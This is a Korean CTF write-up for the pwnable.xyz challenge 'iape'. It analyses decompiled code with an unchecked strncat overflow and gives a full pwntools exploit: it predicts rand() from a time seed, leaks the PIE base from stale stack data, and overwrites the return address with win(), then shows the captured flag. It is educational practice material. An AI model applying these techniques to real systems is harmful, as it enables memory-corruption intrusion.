# [pwnable.xyz] iape

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Shake off the pwn and let's do some programming
>
> Release: [iape.zip](https://github.com/h0meb0dy/pwnable.xyz/files/8973791/iape.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/104156058/175478380-68873a5b-4d3b-41ff-99b4-a2690e912383.png)

## Analysis

### `win()`

```c
int win()
{
  return system("cat flag");
}
```

`win()`이 실행되도록 하면 플래그를 획득할 수 있다.

### `setup()`

```c
void setup()
{
  unsigned int v0; // eax

  setvbuf(&IO_2_1_stdout_, 0LL, 2, 0LL);
  setvbuf(&IO_2_1_stdin_, 0LL, 2, 0LL);
  signal(14, (__sighandler_t)handler);
  alarm(0xB4u);
  v0 = time(0LL);
  srand(v0);
}
```

현재 시간을 인자로 받아서 `srand()`를 실행하여 랜덤 시드를 설정한다.

### `main()`

```c
  char s[1024]; // [rsp+10h] [rbp-400h] BYREF

  setup();
  memset(s, 0, sizeof(s));
```

`setup()`을 실행하고, `0x400`바이트짜리 배열 `s`를 0으로 초기화한다.

#### 1. Init

```c
      if ( op != 1 )
        break;
      printf("data: ");
      fgets(s, 0x80, stdin);
```

`s`에 `0x80`바이트만큼 문자열을 입력받는다.

#### 2. Append

```c
    if ( op == 2 )
    {
      append(s);
    }
```

```c
char *__fastcall append(char *s)
{
  char buf[28]; // [rsp+10h] [rbp-20h] BYREF
  unsigned int randomLen; // [rsp+2Ch] [rbp-4h]

  randomLen = rand() % 0x10;
  printf("Give me %d chars: ", randomLen);
  read(0, buf, (int)randomLen);
  return strncat(s, buf, (int)randomLen);
}
```

`rand()`의 반환값을 `0x10`으로 나눈 나머지를 `randomLen`에 넣는다. 즉 `randomLen`은 `0`이상 `0xf` 이하의 랜덤한 정수가 된다.

이 `randomLen`만큼 문자열을 입력받아서 인자로 받은 `s`에 이어붙인다.

#### 3. Print

```c
    else if ( op == 3 )
    {
      printf("Your message: %s\n", s);
    }
```

`s`에 저장되어 있는 문자열을 `"%s"`로 출력한다.

## Exploit

`append()`에서는 현재 `s`의 길이가 얼마인지 검사하지 않기 때문에, 문자열을 무한히 이어붙일 수 있다. 따라서 BOF가 발생하고 이를 이용하여 `main()`의 return address를 `win()`의 주소로 덮어쓰면 플래그를 획득할 수 있다.

### Generate random values

파이썬의 `cyptes` 모듈을 이용하여 libc의 함수들을 사용할 수 있다. `time()`, `srand()`, `rand()` 함수들을 문제에서와 같은 방법으로 사용하여 랜덤 값들을 재현할 수 있다. 그러면 `append()`에서 랜덤으로 주는 길이들을 미리 계산해놓을 수 있다.

서버에서 할 때는 서버 시간보다 로컬 시간이 늦는 경우가 많아서, `libc.time(0)`에서 1을 빼서 시드로 사용하였다.

```python
libc = CDLL('/lib/x86_64-linux-gnu/libc-2.27.so')
libc.srand(libc.time((0)))

# generate random values

randValues = []
randSum = 0

while randSum <= 0x388:
    randValue = libc.rand() % 0x10
    randValues.append(randValue)
    randSum += randValue
```

### PIE leak

PIE가 걸려있기 때문에 `win()`의 주소를 알아내려면 먼저 PIE base를 알아내야 한다. `s`를 가득 채우고 `"%s"`로 출력하면 SFP의 값이 같이 출력되는 것을 이용하여 할 수 있을 것 같았지만, `strncat()`이 문자열을 이어붙일 때 마지막에 `'\x00'`을 추가하기 때문에 불가능하다.

`append()`의 스택 프레임을 보면 다음과 같다.

![image](https://user-images.githubusercontent.com/104156058/175493082-378834ed-b497-4dc0-8d78-a036a841fb94.png)

`rbp-0x20`부터 `randomLen`만큼 입력을 받는데, 바로 뒤쪽에 `read_int32+64`의 주소가 있다. `read_int32()` 내부에서 `atoi()`를 호출할 때 쌓인 return address가 쓰레기값으로 남아있다.

만약 `randomLen`이 `14` 이상일 때 8바이트만 입력하면, `strncat()`이 `read_int32+64`의 주소까지 가져와서 `s`에 이어붙이게 된다. 이때 `s`를 출력하면 PIE base를 계산할 수 있다.

```python
# PIE leak

Init('A' * (0x408 - randSum))

leaked = False # true if PIE is leaked

for randValue in randValues:
    if randValue >= 14 and not leaked:
        sla('> ', '2')
        sa('chars: ', 'A' * 8)
        
        Print()

        r.recvline()
        pie = u64(r.recvline()[-7:-1].ljust(8, b'\x00')) - 0xbc2 # PIE base
        log.info('PIE base: ' + hex(pie))
        win = pie + win_offset

        leaked = True
    elif randValue == 0:
        Append('A' * randValue, True)
    else:
        Append('A' * randValue)
```

`main()`의 return address 직전까지 `0x408`바이트를 채우면서, `randomLen`이 14이상일 때 PIE를 leak한다.

### RET overwrite

`main()`의 return address를 `win()`의 주소로 덮어쓰면 플래그를 획득할 수 있다.

```python
# RET overwrite

overwritten = 0 # overwritten bytes in return address

while overwritten < 6:
    sla('> ', '2')

    r.recvuntil('Give me ')
    chars = int(r.recvuntil(' ')[:-1])

    if overwritten + chars > 8:
        sa('chars: ', p64(win + 4)[overwritten:])
    else:
        sa('chars: ', p64(win + 4)[overwritten:overwritten + chars])

    overwritten += chars

sla('> ', '0') # return main()
```

### Full exploit

```python
from pwn import *
from ctypes import *

REMOTE = True

if not REMOTE:
    r = process('./release/challenge')
    libc = CDLL('/lib/x86_64-linux-gnu/libc-2.27.so')
    libc.srand(libc.time((0)))
else:
    r = remote('svc.pwnable.xyz', 30014)
    libc = CDLL('/lib/x86_64-linux-gnu/libc-2.27.so')
    libc.srand(libc.time((0)) - 1) # server time delay

sla = r.sendlineafter
sa = r.sendafter

def Init(data):
    sla('> ', '1')
    sla('data: ', data)

def Append(data, zero=False):
    sla('> ', '2')
    if not zero:
        sa('chars: ', data)

def Print():
    sla('> ', '3')

win_offset = 0xb57 # offset of win() from PIE base


# generate random values

randValues = []
randSum = 0

while randSum <= 0x388:
    randValue = libc.rand() % 0x10
    randValues.append(randValue)
    randSum += randValue


# PIE leak

Init('A' * (0x408 - randSum))

leaked = False # true if PIE is leaked

for randValue in randValues:
    if randValue >= 14 and not leaked:
        sla('> ', '2')
        sa('chars: ', 'A' * 8)
        
        Print()

        r.recvline()
        pie = u64(r.recvline()[-7:-1].ljust(8, b'\x00')) - 0xbc2 # PIE base
        log.info('PIE base: ' + hex(pie))
        win = pie + win_offset

        leaked = True
    elif randValue == 0:
        Append('A' * randValue, True)
    else:
        Append('A' * randValue)


# RET overwrite

overwritten = 0 # overwritten bytes in return address

while overwritten < 6:
    sla('> ', '2')

    r.recvuntil('Give me ')
    chars = int(r.recvuntil(' ')[:-1])

    if overwritten + chars > 8:
        sa('chars: ', p64(win + 4)[overwritten:])
    else:
        sa('chars: ', p64(win + 4)[overwritten:overwritten + chars])

    overwritten += chars

sla('> ', '0') # return main()


r.interactive()
```

```
$ python3 ex.py
[+] Opening connection to svc.pwnable.xyz on port 30014: Done
[*] PIE base: 0x559dfdb9c000
[*] Switching to interactive mode
FLAG{I_h0pe_u_didnt_bf_this_0ne}
```